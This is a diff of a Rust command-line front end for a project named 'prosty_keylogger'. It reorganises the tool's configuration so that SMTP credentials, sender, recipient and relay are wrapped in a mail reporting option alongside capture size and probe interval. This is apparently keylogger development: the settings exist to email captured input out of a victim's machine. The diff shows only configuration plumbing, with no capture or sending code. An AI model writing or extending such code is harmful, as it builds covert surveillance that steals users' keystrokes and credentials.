@@ -1,6 +1,6 @@
 use std::path::PathBuf;
 use clap::Parser;
-use prosty_keylogger::common::TaskConfiguration;
+use prosty_keylogger::common::{MailConfiguration, ReportConfig, TaskConfiguration};
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -38,11 +38,15 @@ impl From<&Args> for TaskConfiguration{
     fn from(value: &Args) -> Self {
         Self{
             id: 0,
-            smtp_login: value.smtp_login.clone(),
-            smtp_password: value.smtp_password.to_owned(),
-            mail_from: value.mail_from.to_owned(),
-            mail_to: value.mail_to.to_owned(),
-            relay: value.relay.to_owned(),
+            report_config: ReportConfig::Mail(MailConfiguration{
+                smtp_login: value.smtp_login.clone(),
+                smtp_password: value.smtp_password.to_owned(),
+                mail_from: value.mail_from.to_owned(),
+                mail_to: value.mail_to.to_owned(),
+                relay: value.relay.to_owned(),
+
+            }),
+
             capture_size: value.capture_size,
             probe_interval_milli: value.interval,
         }
